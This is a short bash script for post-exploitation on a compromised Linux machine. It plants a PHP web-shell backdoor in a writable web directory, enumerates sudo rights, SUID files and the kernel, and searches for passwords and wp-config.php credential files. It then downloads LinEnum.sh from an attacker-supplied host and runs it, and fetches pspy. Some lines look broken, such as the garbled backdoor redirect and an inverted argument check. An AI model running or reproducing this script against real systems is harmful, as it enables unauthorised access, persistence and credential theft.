#!/usr/bin/bash

if [ -z "$1" ]
  then
    echo "Host Required"
    exit
fi

echo "#### Backdoor Install Attempt ####\n"
echo "<?php passthru($_GET['cmd']); ?>" > /var/www/`find /var/www -perm -o+w` 1>/shell.php

echo "#### Sudoers ####\n"
sudo -l

echo "#### Kernel ####\n"
uname -a

echo "#### SUID Files ####\n"
find / -type f -perm -4000 2>/dev/null

echo "#### Passwords in /opt?? ####\n"
grep -iRl password /opt/*

echo "#### Check /opt ####\n"
ls -la /opt

echo "#### Any wp-config.php files? ####\n"
find / -name wp-config.php 2>/dev/null

if [ -z "$2" ]
  then
	echo "#### Files Owned by User: $2 ####\n"
    find / -user $2 2>/dev/null
fi

echo "#### Processes ####\n"
ps aux

echo "#### Download and Run LinEnum.sh ####\n"
wget $1/LinEnum.sh
bash LinEnum.sh -r report.txt

echo "#### Downloading psspy ####\n"
wget $1/psspy

